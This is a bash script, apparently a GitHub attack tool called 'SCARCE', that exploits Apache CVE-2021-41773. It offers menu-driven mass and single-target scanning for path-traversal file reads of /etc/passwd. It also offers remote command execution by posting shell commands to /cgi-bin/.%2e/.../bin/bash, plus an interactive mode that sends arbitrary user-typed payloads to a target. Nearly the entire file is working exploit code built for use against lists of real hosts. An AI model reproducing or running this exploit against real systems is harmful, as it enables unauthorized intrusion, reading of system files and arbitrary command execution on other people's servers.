#!/bin/bash
#Colors variabel
NC='\033[0m'
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;040m'
ORANGE='\033[1;38;5;202m'
BLUE='\033[1;38;5;012m'
BLUE2='\033[1;38;5;032m'
PINK='\033[1;38;5;013m'
GRAY='\033[1;38;5;004m'
NEW='\033[1;38;5;154m'
YELLOW='\033[1;38;5;214m'
CG='\033[1;38;5;087m'
CP='\033[1;38;5;221m'
CPO='\033[1;38;5;205m'
CN='\033[1;38;5;247m'
CNC='\033[1;38;5;051m'
regex='^(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]\.[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]$'

#Banner and version
Codename='Shadow Storm'
Vers=1.0.1#beta
LINK='https://github.com/HightechSec/'
function banner(){
echo -e ${CP}"   _____  _____          _____   _____ ______ "
echo -e ${CP}"  / ____|/ ____|   /\   |  __ \ / ____|  ____|"
echo -e ${CP}" | (___ | |       /  \  | |__) | |    | |__   "
echo -e ${CP}"  \___ \| |      / /\ \ |  _  /| |    |  __|  "
echo -e ${CP}"  ____) | |____ / ____ \| | \ \| |____| |____ "
echo -e ${CP}" |_____/ \_____/_/    \_\_|  \_\\_____|______|"
echo -e "${BLUE2}A Framework for Scanning and Command Execution"
echo -e "       ${BLUE2}Apache2 CVE-2021-41773"
}
#Main Menu
function Main_Menu(){
clear
banner
	echo ""
    echo -e "${CN}Author   : ${BLUE}Hightech ($LINK)"
	echo -e "${CN}Codename : ${CPO}${Codename}"
	echo -e "${CN}Version  : ${BLUE}${Vers}"
	echo ""
	echo -e "  ${NC}[${CG}"1"${NC}]${CNC} LFI Scanner"
	echo -e "  ${NC}[${CG}"2"${NC}]${CNC} RCE Scanner"
	echo -e "  ${NC}[${CG}"3"${NC}]${CNC} RCE only Menu"
	echo -e "  ${NC}[${CG}"4"${NC}]${CNC} Exit"
	
	echo ""
	echo -ne "${YELLOW}Input your choice: "; tput sgr0
read Menus
#Menu Function
if test "$Menus" == '1'
then
    LFIScanMenus
elif test "$Menus" == '2'
then
	RCEScanMenus
elif test "$Menus" == '3'
then
    RCEMenus	
 elif test "$Menus" == '4'
then
	exit
 else
    Main_Menu
    fi
}
function rce(){
	curl -s --data "A=|echo;${payload}" "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash"
}

function LFIScanMenus(){
    clear
    banner
	echo ""
	echo -e " ${CNC}LFI Scanner Menu"

	echo -e "  ${NC}[${CG}"1"${NC}]${CNC} LFI Scanner for Mass Target"
	echo -e "  ${NC}[${CG}"2"${NC}]${CNC} LFI Scanner for Single Target"
	echo -e "  ${NC}[${CG}"3"${NC}]${CNC} Back to Main menu"
    echo -e "  ${NC}[${CG}"4"${NC}]${CNC} Exit"

	echo ""
	echo -ne "${YELLOW}Input your choice: "; tput sgr0
	read LFIScanMenu
#Menu Function
if test "$LFIScanMenu" == '1'
then
    mass_lfiscan
elif test "$LFIScanMenu" == '2'
then
	single_lfiscan
 elif test "$LFIScanMenu" == '3'
then
	Main_Menu
 elif test "$LFIScanMenu" == '4'
then
	exit
    else
    LFIScanMenus
    fi
}
function mass_lfiscan(){
	echo -ne "${YELLOW}Input your file (ex: /path/to/file.txt): "; tput sgr0
	read LISTS
	echo -ne "${YELLOW}Save lfi-scan result as (ex: vulns.txt): "; tput sgr0
	read savedlfi
		if [[ -f ${LISTS} ]]; then
	            echo -e "${GREEN}SUCCESS: File Loaded!"
            else :
                echo -e "${RED}ERROR: File not found!"
                mass_lfiscan
                return 1
        fi
clear        
for SITE in $(cat $LISTS);
do
	echo ""
	echo -e "${PINK}Mass LFI Scan process started..."
	echo -e "${PINK}Target: ${GRAY}${SITE}..."
		if [[ $(curl -k --silent --path-as-is --insecure "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd") =~ "root:" ]]; then
			    echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
				echo ${SITE} >> ${savedlfi} 
		elif [[ $(curl -k --silent --path-as-is --insecure "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" -w %{http_code} -o /dev/null ) =~ '500' ]]; then
		    echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
			else :
				echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
		fi
done
}
function single_lfiscan(){
	echo ""	
	echo -ne "${YELLOW}Input your target (ex: http://example.com): "; tput sgr0
	read SITE
	        if [[ ${SITE} =~ $regex ]]; then
	            :
                else :
                    echo -e "${RED}ERROR: ${SITE} is not a Valid URL"
	                single_lfiscan
                    return 1
	        fi		 
    clear  
	echo ""
	echo -e "${PINK}Scanning process started..."
	echo -e "${PINK}Target: ${GRAY}${SITE}..."
	        if [[ $(curl --silent "http://${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd") =~ "root:" ]]; then
			    echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
		elif [[ $(curl --silent "http://${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" -w %{http_code}) =~ '500' ]]; then
		    echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
			else :
				echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
		fi
}
function RCEScanMenus(){
    clear
    banner
	echo ""
	echo -e " ${CNC}RCE Scanner Menu"
	echo -e "  ${NC}[${CG}"1"${NC}]${CNC} RCE Scanner for Mass Target"
	echo -e "  ${NC}[${CG}"2"${NC}]${CNC} RCE Scanner for Single Target"
	echo -e "  ${NC}[${CG}"3"${NC}]${CNC} Back to Main menu"
    echo -e "  ${NC}[${CG}"4"${NC}]${CNC} Exit"

	echo ""
	echo -ne "${YELLOW}Input your choice: "; tput sgr0
	read RCEScanMenu
#Menu Function
if test "$RCEScanMenu" == '1'
then
    mass_rcescan
elif test "$RCEScanMenu" == '2'
then
	single_rcescan
 elif test "$RCEScanMenu" == '3'
then
	Main_Menu
 elif test "$RCEScanMenu" == '4'
then
	exit
    else
    RCEScanMenu
    fi
}
function mass_rcescan(){
	echo -ne "${YELLOW}Input your file (ex: /path/to/file.txt): "; tput sgr0
	read LISTS
	echo -ne "${YELLOW}Save rce-scan result as (ex: vulns.txt): "; tput sgr0
	read savedrce
		    if [[ -f ${LISTS} ]]; then
	            echo -e "${GREEN}SUCCESS: File Loaded!"
                    else :
                        echo -e "${RED}ERROR: ${LISTS} not found!"
                        mass_rcescan
                        return 1
            fi
clear
for SITE in $(cat $LISTS);
do
    echo ""
	echo -e "${PINK}RCE Scanning process started..."
	echo -e "${PINK}Target: ${GRAY}${SITE}..."
	        if [[ $(curl --silent --data "A=|echo;id;uname -a" "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash" | tr -d '\0' ) =~ "uid=" ]]; then
	        	    echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
					echo ${SITE} >> ${savedrce} 
	        elif [[ $(curl --silent --data "A=|echo;id;uname -a" "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash" -w %{http_code} | tr -d '\0') = '500' ]]; then
	        		echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
	            else :
	        		echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
            fi
    done
}
function single_rcescan(){ 
	echo ""	
	echo -ne "${YELLOW}Input your target (ex: http://example.com): "; tput sgr0
	read SITE
	        if [[ ${SITE} =~ $regex ]]; then
	            :
                else :
                    echo -e "${RED}ERROR: ${SITE} is not a Valid URL"
	                single_scan
                    return 1
	        fi		 
    clear  
	echo ""
	echo -e "${PINK}RCE Scanning process started..."
	echo -e "${PINK}Target: ${GRAY}${SITE}..."
	        if [[ $(curl --silent --data "A=|echo;id;uname -a" "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash" | tr -d '\0' ) =~ "uid=" ]]; then
	        	    echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}" 
	        elif [[ $(curl --silent --data "A=|echo;id;uname -a" "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash" -w %{http_code} | tr -d '\0') = '500' ]]; then
	        		echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
	            else :
	        		echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
            fi
}
function RCEMenus(){
    clear
    banner
	echo ""
	echo -e " ${CNC}RCE Menu"
	echo -e "  ${NC}[${CG}"1"${NC}]${CNC} RCE For Single Target"
	echo -e "  ${NC}[${CG}"2"${NC}]${CNC} Back"
    echo -e "  ${NC}[${CG}"3"${NC}]${CNC} Exit"

	echo ""
	echo -ne "${YELLOW}Input your choice: "; tput sgr0
	read RCEMenu
#Menu Function
if test "$RCEMenu" == '1'
then
	single_rce
 elif test "$RCEMenu" == '2'
then
	Main_Menu
 elif test "$RCEMenu" == '3'
then
	exit
    else
    RCEMenus
    fi
}

function single_rce(){
	echo ""	
	echo -ne "${YELLOW}Input your target (ex: http://example.com): "; tput sgr0
	read SITE
	        if [[ ${SITE} =~ $regex ]]; then
	            :
                else :
                    echo -e "${RED}ERROR: ${SITE} is not a Valid URL"
	                single_lfiscan
                    return 1
	        fi		 
#    clear  
	echo ""
	echo -e "${PINK}Scanning process started..."
	echo -e "${PINK}Target: ${GRAY}${SITE}..."
				echo -ne "${YELLOW}Input your Payload: "; tput sgr0
			    read payload
				rce
}	
Main_Menu